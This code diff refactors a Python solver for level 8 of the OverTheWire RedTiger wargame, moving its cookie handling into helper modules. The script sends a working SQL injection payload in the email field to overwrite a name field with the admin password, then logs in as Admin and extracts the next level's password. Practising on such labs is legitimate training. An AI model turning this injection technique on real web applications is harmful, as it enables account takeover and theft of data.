@@ -2,6 +2,8 @@
 import pickle
 import tigers as tg
 from bs4 import BeautifulSoup
+import tiger_cookies
+from connect import my_request as req
 
 
 def main():
@@ -11,38 +13,26 @@ def main():
     url = "https://redtiger.labs.overthewire.org/level8.php"
     finds = 'name'  # What we are finding
     pass_r = 'The password for the next level is: '
+    level = 'level8login'
 
-    try:
-        with open('cooks.pickle', 'rb') as f:
-            cooks = pickle.load(f)
-        if 'level8login' not in cooks:
-            print('use prevision level')
-            exit(1)
-    except:
-        print('use level 1')
-        exit(1)
-
-    cook = dict(level8login=cooks['level8login'])
+    cooks = tiger_cookies.check_cookies(level)
+    cook = dict(level8login=cooks[level])
 
     # Payload
     data = dict(email="',name = password,email = '", edit="Edit")
-    response = tg.get_request(url, data, cook, method='post')
+    response = req.post_request(url, data, cook)
 
     soup = BeautifulSoup(response, 'html.parser')
     passw = soup.find('input', {'name': 'name'})['value']
 
     # Authorization
     data = dict(user='Admin', password=passw, login='Login')
-    response = tg.get_request(url, data, cook, method='post')
+    response = req.post_request(url, data, cook)
 
     # Еxtracting data from html
     passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
     print('password:', passw)
-
-    # Save cookie
-    if ('level9login' not in cooks) or (cooks['level9login'] != passw):
-        cooks['level9login'] = passw
-        tg.save_cookies(cooks)
+    tiger_cookies.save_cookies(cooks, level, passw)
 
 
 if __name__ == '__main__':
